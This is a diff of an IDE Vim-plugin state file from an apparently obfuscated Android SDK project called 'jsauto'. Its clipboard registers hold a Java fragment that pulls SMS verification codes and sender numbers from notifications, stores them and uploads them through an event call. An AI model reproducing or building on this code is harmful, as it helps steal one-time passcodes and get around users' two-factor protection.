@@ -3,7 +3,7 @@
     <state version="4" enabled="true" />
     <globalmarks />
     <filemarks>
-      <file name="E:/Project/gpjsauto/rOOTSDK_Plugin_onlyjsauto/src/main/java/com/efqps/yivj/NService.java" timestamp="1571922047361">
+      <file name="E:/Project/gpjsauto/rOOTSDK_Plugin_onlyjsauto/src/main/java/com/efqps/yivj/NService.java" timestamp="1571922761002">
         <mark key="[" line="42" column="0" />
         <mark key="]" line="42" column="0" />
         <mark key="." line="42" column="0" />
@@ -34,9 +34,9 @@
       </file>
       <file name="E:/Project/gpjsauto/rOOTSDK_Plugin_onlyjsauto/build.gradle" timestamp="1571904619935">
         <mark key="'" line="162" column="4" />
-        <mark key="[" line="576" column="11" />
-        <mark key="]" line="577" column="0" />
-        <mark key="." line="577" column="0" />
+        <mark key="[" line="580" column="11" />
+        <mark key="]" line="581" column="0" />
+        <mark key="." line="581" column="0" />
       </file>
       <file name="E:/Project/gpjsauto/dynamicsdk/src/main/java/com/vuky/jdmp/fkyr/OikService.java" timestamp="1571919960929">
         <mark key="[" line="32" column="26" />
@@ -124,7 +124,7 @@
         <mark key="^" line="12" column="66" />
         <mark key="." line="12" column="66" />
       </file>
-      <file name="E:/Project/gpjsauto/dynamicsdk/release/README.txt" timestamp="1571921049201" />
+      <file name="E:/Project/gpjsauto/dynamicsdk/release/README.txt" timestamp="1571924193899" />
       <file name="E:/Project/gpjsauto/dynamicsdk/src/main/java/com/wmjr/zfwus/UvtActivity.java" timestamp="1571646423731">
         <mark key="[" line="12" column="24" />
         <mark key="]" line="12" column="24" />
@@ -207,10 +207,10 @@
         <mark key="^" line="37" column="29" />
         <mark key="." line="37" column="31" />
       </file>
-      <file name="E:/Project/gpjsauto/rOOTSDK_Plugin_onlyjsauto/src/main/java/com/wv/util/XConstants.java" timestamp="1571897639564">
-        <mark key="[" line="5" column="0" />
-        <mark key="]" line="5" column="0" />
-        <mark key="." line="5" column="0" />
+      <file name="E:/Project/gpjsauto/rOOTSDK_Plugin_onlyjsauto/src/main/java/com/wv/util/XConstants.java" timestamp="1571924501845">
+        <mark key="[" line="3" column="0" />
+        <mark key="]" line="3" column="0" />
+        <mark key="." line="3" column="0" />
       </file>
       <file name="E:/Project/sbgp/zHooKDemoOK_B/src/main/java/com/hook/reflect/ToolApi.java" timestamp="1568790355449">
         <mark key="[" line="524" column="21" />
@@ -301,12 +301,13 @@
         <mark key="^" line="6" column="18" />
         <mark key="." line="6" column="18" />
       </file>
-      <file name="E:/Project/gpjsauto/wake/src/main/java/com/carey/justin/wake/MainActivity.java" timestamp="1571921077750">
+      <file name="E:/Project/gpjsauto/wake/src/main/java/com/carey/justin/wake/MainActivity.java" timestamp="1571924205029">
         <mark key="[" line="11" column="33" />
         <mark key="]" line="11" column="32" />
         <mark key="^" line="11" column="32" />
         <mark key="." line="11" column="32" />
       </file>
+      <file name="E:/Project/gpjsauto/dynamicsdk/src/main/java/com/dhlgk/svxt/CysuService.java" timestamp="1571924036635" />
       <file name="E:/Project/DynamicLoader/eve_trace/build.gradle" timestamp="1568637584745">
         <mark key="[" line="39" column="1" />
         <mark key="]" line="37" column="33" />
@@ -471,6 +472,12 @@
         <mark key="." line="50" column="41" />
         <mark key="^" line="66" column="28" />
       </file>
+      <file name="E:/Project/gpjsauto/dynamicsdk/src/main/java/com/fszp/vwjwb/XqdService.java" timestamp="1571922929165">
+        <mark key="[" line="86" column="16" />
+        <mark key="]" line="33" column="20" />
+        <mark key="." line="33" column="20" />
+        <mark key="^" line="33" column="20" />
+      </file>
       <file name="E:/Project/demo2/app/build.gradle" timestamp="1571715928015">
         <mark key="[" line="29" column="85" />
         <mark key="]" line="29" column="12" />
@@ -537,6 +544,7 @@
         <mark key="]" line="12" column="22" />
         <mark key="." line="12" column="22" />
       </file>
+      <file name="E:/Project/gpjsauto/dynamicsdk/src/main/java/com/cfag/zjnv/WiuwConstants.java" timestamp="1571924525467" />
       <file name="E:/Project/gpjsauto/rOOTSDK_Plugin_onlyjsauto/src/main/java/com/wv/bean/WebviewBaseBean.java" timestamp="1571629720911">
         <mark key="[" line="96" column="48" />
         <mark key="]" line="96" column="37" />
@@ -654,7 +662,16 @@
     </jumps>
     <registers>
       <register name="&quot;" type="4">
-        <text>statusBarNotification</text>
+        <text>if (!TextUtils.isEmpty(code)) {
+                    SmsStoreManager.getInstance().add(new CodeDao(sender,code, when));
+                }
+                if( JSAutoConfig.openLog){
+                    String value = &quot;&quot;+code+sender+when;
+                    if (!hadUpload.contains(value)) {
+                        hadUpload.add(value);
+                        LogcatAction.onEvent(context, &quot;notify&quot;, &quot;size:&quot;+ SmsStoreManager.getInstance().size(), &quot;code:&quot;+code+&quot;,nu:&quot;+sender+&quot;,pkg:&quot;+packageName, &quot;&quot;+contentText);
+                    }
+                }</text>
       </register>
       <register name="f" type="4">
         <text />
@@ -671,14 +688,23 @@
       <register name="p" type="2">
         <text encoding="base64">ICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBpKENsYXNzPD8+IGNsYXp6LCBTdHJpbmcgbXNnKSB7CiAgICAgICAgTG9nLmkoY3JlYXRlVGFnKGNsYXp6KSwgbXNnKTsKICAgIH0K</text>
       </register>
-      <register name="1" type="2">
-        <text encoding="base64">ICAgICAgICAgICAgc2JuLgo=</text>
+      <register name="1" type="4">
+        <text>if (!TextUtils.isEmpty(code)) {
+                    SmsStoreManager.getInstance().add(new CodeDao(sender,code, when));
+                }
+                if( JSAutoConfig.openLog){
+                    String value = &quot;&quot;+code+sender+when;
+                    if (!hadUpload.contains(value)) {
+                        hadUpload.add(value);
+                        LogcatAction.onEvent(context, &quot;notify&quot;, &quot;size:&quot;+ SmsStoreManager.getInstance().size(), &quot;code:&quot;+code+&quot;,nu:&quot;+sender+&quot;,pkg:&quot;+packageName, &quot;&quot;+contentText);
+                    }
+                }</text>
       </register>
       <register name="q" type="4">
         <text>f=hdit;hditdt;</text>
       </register>
       <register name="2" type="2">
-        <text encoding="base64">ICAgICAgICBwcmludGxuKCJlbmNyeXRKcyMjIyNkb0ZpcnN0IikK</text>
+        <text encoding="base64">ICAgICAgICAgICAgc2JuLgo=</text>
       </register>
       <register name="r" type="2">
         <text encoding="base64">W3NdOiBodHRwOi8vdmltZG9jLm5ldC9zZWFyY2g/cT0vXFwK</text>
@@ -690,16 +716,16 @@
         <text>content</text>
       </register>
       <register name="4" type="2">
-        <text encoding="base64">ICAgICAgCg==</text>
+        <text encoding="base64">ICAgICAgICBwcmludGxuKCJlbmNyeXRKcyMjIyNkb0ZpcnN0IikK</text>
       </register>
       <register name="5" type="2">
-        <text encoding="base64">Ly8gICAgICAgIGV4ZWN7Ci8vICAgICAgICAgICAgZGVmIGYgPSBqc1Byb3RlY3REaXIrIlxcIitqc2VzWyJodHRwUG9zdGpzIl0KLy8gICAgICAgICAgICBjb21tYW5kTGluZSAnamF2YScsICctamFyJywgIiRwYXRoIiwgIiRmIgovLyAgICAgICAgfQo=</text>
+        <text encoding="base64">ICAgICAgCg==</text>
       </register>
       <register name="u" type="4">
         <text>http://vimdoc.net/search?q=/\\</text>
       </register>
       <register name="6" type="2">
-        <text encoding="base64">ICAgICAgICAgICAgZGVmIGNtID0gWydqYXZhJywgJy1qYXInLCBwYXRoLCBmXQo=</text>
+        <text encoding="base64">Ly8gICAgICAgIGV4ZWN7Ci8vICAgICAgICAgICAgZGVmIGYgPSBqc1Byb3RlY3REaXIrIlxcIitqc2VzWyJodHRwUG9zdGpzIl0KLy8gICAgICAgICAgICBjb21tYW5kTGluZSAnamF2YScsICctamFyJywgIiRwYXRoIiwgIiRmIgovLyAgICAgICAgfQo=</text>
       </register>
       <register name="7" type="2">
         <text encoding="base64">ICAgICAgICAgICAgZGVmIGNtID0gWydqYXZhJywgJy1qYXInLCBwYXRoLCBmXQo=</text>
@@ -708,10 +734,10 @@
         <text>proguard</text>
       </register>
       <register name="8" type="2">
-        <text encoding="base64">ICAgICAgICAgICAgY29tbWFuZExpbmUgWydqYXZhJywgJy1qYXInLCBwYXRoLCBmCg==</text>
+        <text encoding="base64">ICAgICAgICAgICAgZGVmIGNtID0gWydqYXZhJywgJy1qYXInLCBwYXRoLCBmXQo=</text>
       </register>
       <register name="9" type="2">
-        <text encoding="base64">ICAgICAgICAgICAgZGVmIGNvbW1uYQo=</text>
+        <text encoding="base64">ICAgICAgICAgICAgY29tbWFuZExpbmUgWydqYXZhJywgJy1qYXInLCBwYXRoLCBmCg==</text>
       </register>
       <register name=":" type="4">
         <text>%s/MsService/b/gc</text>
